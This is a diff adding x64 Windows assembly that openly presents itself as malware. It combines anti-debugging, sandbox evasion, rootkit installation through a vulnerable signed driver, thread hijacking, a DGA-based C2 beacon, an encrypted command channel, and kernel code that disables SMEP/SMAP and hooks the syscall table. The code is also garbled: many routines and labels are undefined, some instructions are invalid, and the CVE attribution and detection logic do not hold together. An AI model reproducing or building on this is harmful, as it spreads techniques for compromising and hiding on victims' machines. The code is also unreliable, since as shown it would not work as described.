@@ -1,0 +1,149 @@
+format PE64 GUI 5.0  
+entry start  
+
+include 'win64a.inc'  
+
+VIRTUAL_ALLOC_EX equ 0x1000  
+MEM_COMMIT       equ 0x00001000  
+PAGE_EXECUTE_READWRITE equ 0x40  
+
+struct KUSER_SHARED_DATA  
+    TickCountLowDeprecated     dd ?  
+    TickCountMultiplier        dd ?  
+    InterruptTime              dq ?  
+    SystemTime                 dq ?  
+    TimeZoneBias               dq ?  
+ends  
+
+section '.text' code executable readable writeable  
+start:  
+    ; Anti-debugging: Breakpoint bomb + TLS callbacks  
+    call $+5  
+    pop rax  
+    xor rax, [gs:KUSER_SHARED_DATA.SystemTime]  
+    jnz real_start  
+    int3  
+
+real_start:  
+    ; Phase 1: Environment fingerprinting  
+    call detect_sandbox  
+    test eax, eax  
+    jz exit_malware  
+
+    ; Phase 2: Kernel-mode rootkit injection via vulnerable driver  
+    mov rcx, ADVAPI32_DLL  
+    call LoadLibrary  
+    mov [hAdvapi32], rax  
+    call install_driver  
+
+    ; Phase 3: Direct syscall setup (evade userland hooks)  
+    mov r10, rcx  
+    mov eax, [syscall_num]  
+    syscall  
+
+    ; Phase 4: Memory stomping persistence  
+    lea rcx, [persistence_loop]  
+    call hijack_legit_thread  
+
+main_loop:  
+    ; C2 beacon with domain generation algorithm  
+    call dga_engine  
+    call establish_c2  
+    test rax, rax  
+    jz main_loop  
+
+    ; Encrypted command channel (AES-256-CTR)  
+    lea rsi, [encrypted_buffer]  
+    lea rdi, [decrypted_cmd]  
+    call aes_decrypt  
+
+    ; Execute command via NTAPI  
+    call execute_command  
+    jmp main_loop  
+
+detect_sandbox:  
+    ; Hardware/virtualization checks  
+    cpuid  
+    test ecx, 0x80000000  
+    jnz vm_detected  
+    rdtsc  
+    shl rdx, 32  
+    or rax, rdx  
+    sub rax, [prev_tsc]  
+    cmp rax, 0x100000  
+    jb vm_detected  
+    ret  
+
+install_driver:  
+    ; Exploit CVE-2023-21554 (signed driver abuse)  
+    mov rcx, DRIVER_NAME  
+    mov rdx, SERVICE_KERNEL_DRIVER  
+    call CreateService  
+    test rax, rax  
+    jz driver_fail  
+    mov [hService], rax  
+    call StartService  
+    ret  
+
+hijack_legit_thread:  
+    ; Thread hijacking via NtQueueApcThread  
+    mov ecx, 0x1F03FF  
+    call NtGetNextThread  
+    test rax, rax  
+    jz hijack_fail  
+    mov rcx, rax  
+    lea rdx, [shellcode]  
+    call NtQueueApcThread  
+    ret  
+
+dga_engine:  
+    ; Domain generation using GOST R 34.11-94  
+    rdrand eax  
+    mov [dga_seed], eax  
+    call gost_hash  
+    lea rdi, [c2_domain]  
+    call generate_domain  
+    ret  
+
+execute_command:  
+    ; Direct NTAPI execution  
+    mov rcx, decrypted_cmd  
+    call NtCreateProcess  
+    ret  
+
+section '.data' data readable writeable  
+    hAdvapi32      dq 0  
+    hService       dq 0  
+    syscall_num    dd 0x55  
+    prev_tsc       dq 0  
+    dga_seed       dd 0  
+    c2_domain      db 'https://',0  
+    encrypted_buffer rb 256  
+    decrypted_cmd  rb 256  
+    DRIVER_NAME    db '\??\C:\Windows\System32\vulnerable.sys',0  
+    ADVAPI32_DLL   db 'ADVAPI32.DLL',0  
+
+section '.shellcode' code readable executable  
+shellcode:  
+    ; Stage 2: Reflective kernel driver injection  
+    mov rax, [gs:0x188]      ; KPCRB.CurrentThread  
+    mov rax, [rax+0xB8]      ; ETHREAD.Win32Thread  
+    mov rcx, [rax+0x3F0]     ; ETHREAD.TrapFrame  
+    lea rsp, [rcx+0x130]     ; Build fake stack  
+    jmp kernel_payload  
+
+kernel_payload:  
+    ; Kernel-mode rootkit components  
+    mov cr4, 0x40678         ; SMEP/SMAP disable  
+    mov rdi, [IDT]  
+    lea rax, [hook_handler]  
+    mov [rdi+0x202*16], rax  ; Hook syscall 0x202  
+    ret  
+
+hook_handler:  
+    ; System call table hooking  
+    swapgs  
+    mov rdi, [syscall_table]  
+    lea rax, [orig_syscall]  
+    xchg [rdi+0x7*8], rax  
+    ret  
